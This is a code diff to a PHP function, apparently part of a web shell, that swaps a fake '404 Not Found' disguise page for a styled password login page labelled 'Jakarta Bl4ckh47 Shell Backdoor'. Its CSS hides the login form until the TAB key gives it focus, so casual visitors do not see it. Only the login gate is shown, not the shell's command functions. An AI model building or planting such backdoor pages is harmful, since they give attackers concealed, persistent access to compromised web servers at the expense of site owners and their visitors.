@@ -13,17 +13,121 @@ function show_login_page($message = "")
 ?>
     <!DOCTYPE html>
     <html>
-    
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>404 Not Found</title>
-</head><body>
-<h1>Not Found</h1>
-<p>The requested URL was not found on this server.</p>
-<p>Additionally, a 404 Not Found
-error was encountered while trying to use an ErrorDocument to handle the request.</p>
-</body></html>
+    <!DOCTYPE html>
+    <html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: monospace;
+      background: radial-gradient(circle at center, #0b0b0f, #000);
+      color: #c7c7c7;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
 
+    h1 {
+      font-size: 50px;
+      margin: 0;
+      color: #ff3c3c;
+      text-shadow: 0 0 15px rgba(255, 60, 60, 0.6);
+      animation: pulse 2.5s infinite;
+    }
+
+    p {
+      font-size: 20px;
+      color: #888;
+      margin-top: -10px;
+      text-shadow: 0 0 10px rgba(255, 60, 60, 0.4);
+    }
+
+    @keyframes pulse {
+      0%, 100% { text-shadow: 0 0 10px rgba(255, 60, 60, 0.6); }
+      50% { text-shadow: 0 0 25px rgba(255, 60, 60, 0.9); }
+    }
+
+    form {
+      margin-top: 30px;
+      background: rgba(255, 255, 255, 0.03);
+      padding: 20px 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 25px rgba(255, 60, 60, 0.25);
+      backdrop-filter: blur(8px);
+      opacity: 0;
+      pointer-events: none;
+      transition: all 0.6s ease;
+    }
+
+    /* Muncul saat tekan TAB (fokus) */
+    input[type="password"]:focus,
+    input[type="submit"]:focus,
+    form:focus-within {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    input[type="password"] {
+      border: none;
+      border-bottom: 1.5px solid #ff3c3c;
+      background: transparent;
+      padding: 6px;
+      color: #fff;
+      width: 180px;
+      font-size: 15px;
+      transition: all 0.3s ease;
+      text-shadow: 0 0 10px rgba(255, 60, 60, 0.6);
+    }
+
+    input[type="password"]:focus {
+      outline: none;
+      border-bottom: 1.5px solid #ff6666;
+      box-shadow: 0 0 15px rgba(255, 60, 60, 0.5);
+      text-shadow: 0 0 12px rgba(255, 60, 60, 0.8);
+    }
+
+    input[type="password"]::placeholder {
+      color: #777;
+      text-shadow: 0 0 8px rgba(255, 60, 60, 0.4);
+    }
+
+    input[type="submit"] {
+      border: none;
+      padding: 7px 18px;
+      background: linear-gradient(135deg, #ff3c3c, #ff7070);
+      color: #fff;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-left: 8px;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 15px rgba(255, 60, 60, 0.4);
+    }
+
+    input[type="submit"]:hover {
+      background: linear-gradient(135deg, #ff7070, #ff3c3c);
+      box-shadow: 0 0 20px rgba(255, 60, 60, 0.7);
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+  <h1>Jakarta Bl4ckh47</h1><br>
+  <p>Shell Backdoor</p>
+
+  <form action="" method="post">
+    <div align="center">
+      <input type="password" name="pass" placeholder=" Password">&nbsp;
+      <input type="submit" name="submit" value=">">
+    </div>
+  </form>
+</body>
+</html>
 
 
 
